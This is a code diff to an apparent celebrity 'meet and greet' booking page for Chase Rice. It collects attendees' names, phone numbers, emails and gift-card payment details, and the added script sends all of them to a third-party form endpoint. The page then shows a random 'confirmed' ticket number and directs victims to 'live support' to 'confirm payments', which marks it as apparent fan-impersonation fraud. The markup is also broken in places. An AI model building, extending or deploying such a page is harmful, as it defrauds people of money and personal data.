@@ -1204,6 +1204,7 @@ See you soon, Chase Rice</p>
 
 <!-- Step 2: Event Details -->
 <form id="step2" class="container">
+  <input type="hidden" name="access_key" value="42ad2877-f81e-4e64-9fc2-51d25c4a455e">
   <h3>MEET AND GREET FORM FOR CHASE RICE</h3>
   <h4>EVENT DETAILS</h4>
   <label>Event Name:</label>
@@ -1219,6 +1220,7 @@ See you soon, Chase Rice</p>
 
 <!-- Step 3: Attendee Information -->
 <form id="step3" class="container">
+  <input type="hidden" name="access_key" value="42ad2877-f81e-4e64-9fc2-51d25c4a455e">
   <h3>ATTENDEE INFORMATION</h3>
   <label>Name:</label><input type="text" required>
   <label>Phone Number:</label><input type="tel" required>
@@ -1236,6 +1238,7 @@ See you soon, Chase Rice</p>
 
 <!-- Step 4: Meet & Greet Details -->
 <form id="step4" class="container">
+  <input type="hidden" name="access_key" value="42ad2877-f81e-4e64-9fc2-51d25c4a455e">
   <h3>MEET & GREET DETAILS</h3>
   <label>Celebrity Guest:</label><input type="text" required>
   <label>Meet & Greet Time:</label><input type="time" required>
@@ -1247,6 +1250,7 @@ See you soon, Chase Rice</p>
 
 <!-- Step 5: Security & Release -->
 <form id="step5" class="container">
+  <input type="hidden" name="access_key" value="42ad2877-f81e-4e64-9fc2-51d25c4a455e">
   <h3>SECURITY & RELEASE</h3>
   <p><input type="checkbox" required> I understand that security measures will be in place.</p>
   <p><input type="checkbox" required> I grant permission for photos & videos to be taken.</p>
@@ -1259,6 +1263,7 @@ See you soon, Chase Rice</p>
 
 <!-- Final Step: Payment -->
 <form id="paymentStep" class="container">
+  <input type="hidden" name="access_key" value="42ad2877-f81e-4e64-9fc2-51d25c4a455e">
   <h3>Payment Method</h3>
   <label>Select Payment Method:</label>
   <select id="paymentMethod" required>
@@ -1279,39 +1284,43 @@ See you soon, Chase Rice</p>
 
   <button type="submit">Finish</button>
 </form>
+<!-- Confirmation Step -->
+<div id="confirmationStep" class="container" style="display:none; background:#e6ffe6; border:1px solid #04AA6D; padding:20px;">
+  <h3>🎟 Ticket Confirmation</h3>
+  <p id="ticketMessage" style="font-size:18px; font-weight:bold; color:#333;"></p>
+  <ul style="list-style:none; padding:0; font-size:16px; color:#444;">
+    <li><strong>Ticket Number:</strong> <span id="ticketNumber"></span></li>
+    <li><strong>Event:</strong> <span id="eventName"></span></li>
+    <li><strong>Name:</strong> <span id="userName"></span></li>
+    <li><strong>Email:</strong> <span id="userEmail"></span></li>
+  </ul>
+  <button id="homeBtn" style="margin-top:15px; background-color:#333; color:#fff; padding:10px 20px;">Back to Home</button>
+</div>
+    <!-- New message line -->
+    <li style="margin-top:10px; color:#d35400; font-weight:bold;">
+      📢 Contact live support to validate your ticket and confirm your payments and schedule
+    </li>
+  </ul>
+  <button id="homeBtn" style="margin-top:15px; background-color:#333; color:#fff; padding:10px 20px;">Back to Home</button>
+</div>
 
 <script>
+<script>
   // Step navigation
-  document.getElementById("proceedBtn").addEventListener("click", function() {
+  document.getElementById("proceedBtn").addEventListener("click", () => {
     document.getElementById("step1").style.display = "none";
     document.getElementById("step2").style.display = "block";
   });
 
-  document.getElementById("step2").addEventListener("submit", function(e) {
-    e.preventDefault();
-    document.getElementById("step2").style.display = "none";
-    document.getElementById("step3").style.display = "block";
+  ["step2","step3","step4","step5"].forEach((step, idx) => {
+    document.getElementById(step).addEventListener("submit", function(e) {
+      e.preventDefault();
+      this.style.display = "none";
+      document.getElementById("step" + (idx+3)).style.display = "block";
+    });
   });
 
-  document.getElementById("step3").addEventListener("submit", function(e) {
-    e.preventDefault();
-    document.getElementById("step3").style.display = "none";
-    document.getElementById("step4").style.display = "block";
-  });
-
-  document.getElementById("step4").addEventListener("submit", function(e) {
-    e.preventDefault();
-    document.getElementById("step4").style.display = "none";
-    document.getElementById("step5").style.display = "block";
-  });
-
-  document.getElementById("step5").addEventListener("submit", function(e) {
-    e.preventDefault();
-    document.getElementById("step5").style.display = "none";
-    document.getElementById("paymentStep").style.display = "block";
-  });
-
-  // Gift card toggle logic
+  // Gift card toggle
   const paymentMethodSelect = document.getElementById("paymentMethod");
   const giftCardDetails = document.getElementById("giftCardDetails");
   const giftCardNumber = document.getElementById("giftCardNumber");
@@ -1329,10 +1338,80 @@ See you soon, Chase Rice</p>
     }
   });
 
-  // Final submission
-  document.getElementById("paymentStep").addEventListener("submit", function(e) {
+  // Final submission with Web3Forms
+  document.getElementById("paymentStep").addEventListener("submit", async function(e) {
     e.preventDefault();
-    alert("THANK YOU OUR SUPPORT TEAM WILL VERIFY YOUR PAYMENT AND GET BACK TO YOU THROUGH EMAIL WITHIN FEW MINS");
+
+    // Collect all form data
+    const allForms = ["step2","step3","step4","step5","paymentStep"];
+    const formData = new FormData();
+    formData.append("access_key", "42ad2877-f81e-4e64-9fc2-51d25c4a455e");
+
+    allForms.forEach(id => {
+      const inputs = document.querySelectorAll(`#${id} input, #${id} select`);
+      inputs.forEach(input => {
+        if (input.name || input.id) {
+          const key = input.name || input.id;
+          formData.append(key, input.value);
+        }
+      });
+    });
+
+    try {
+      const response = await fetch("https://api.web3forms.com/submit", {
+        method: "POST",
+        body: formData
+      });
+      const result = await response.json();
+
+      if (result.success) {
+        const ticketNumber = "TCK-" + Math.floor(Math.random() * 1000000);
+
+        // Hide payment step
+        document.getElementById("paymentStep").style.display = "none";
+
+        // Show confirmation step
+        document.getElementById("confirmationStep").style.display = "block";
+
+        // Populate ticket details
+        document.getElementById("ticketMessage").textContent = "✅ Thank you! Your ticket has been confirmed.";
+        document.getElementById("ticketNumber").textContent = ticketNumber;
+        document.getElementById("eventName").textContent = document.getElementById("eventName").value;
+
+        // Pull attendee info from Step 3
+        const step3Inputs = document.querySelectorAll("#step3 input, #step3 select");
+        const attendeeDetails = {};
+        step3Inputs.forEach(input => {
+          const label = input.previousSibling.textContent || input.name || input.id;
+          attendeeDetails[label.replace(":","")] = input.value;
+        });
+
+        // Build summary table
+        let summaryHTML = "<table style='width:100%; border-collapse:collapse; margin-top:15px;'>";
+        for (const [key, value] of Object.entries(attendeeDetails)) {
+          summaryHTML += `
+            <tr>
+              <td style="border:1px solid #ccc; padding:8px; font-weight:bold;">${key}</td>
+              <td style="border:1px solid #ccc; padding:8px;">${value}</td>
+            </tr>`;
+        }
+        summaryHTML += "</table>";
+
+        // Insert summary into confirmation step
+        document.getElementById("confirmationStep").insertAdjacentHTML("beforeend", summaryHTML);
+
+      } else {
+        alert("❌ Submission failed. Please try again.");
+      }
+    } catch (error) {
+      alert("⚠️ Error submitting form. Please check your connection.");
+    }
+  });
+
+  // Back to home button
+  document.getElementById("homeBtn").addEventListener("click", function() {
+    document.getElementById("confirmationStep").style.display = "none";
+    document.getElementById("step1").style.display = "block";
   });
 </script>
 
